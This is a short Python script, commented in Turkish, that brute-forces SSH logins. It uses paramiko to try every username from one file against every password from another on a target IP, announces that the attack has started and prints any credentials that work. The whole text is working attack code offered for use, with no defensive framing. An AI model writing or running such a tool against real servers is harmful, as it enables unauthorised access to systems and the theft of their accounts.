import paramiko
import argparse


use = argparse.ArgumentParser()
use.add_argument('-k',required=True ,help='kullanıcı dosyası')
use.add_argument('-p',required=True ,help='Şifre dosyası')
use.add_argument('-ip',required=True,help="ip adresini girin")
use.add_argument('-b',help="bannere karşı saniye girin ")
args = vars(use.parse_args())
ip = (args["ip"])

kullanıcıfile = open((args["k"]),"r")
kullanıcıread = kullanıcıfile.read().split("\n") 
kullanıcıfile.close()

sıfrefile = open((args["p"]),"r")
sıfreread = sıfrefile.read().split("\n")
sıfrefile.close()
print("saldırı basladı...")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
for i in kullanıcıread:
    for a in sıfreread:
        try:
            sonuc = ssh.connect(ip,username=i,password=a,banner_timeout = (args["b"]))
            
            print("-"*30,"bulundu","-"*30)
            print("kullanıcı adı :",i)
            print("şifre :",a)
            print("-"*30,"bulundu","-"*30)
            ssh.close()
            
        except:
            pass
            
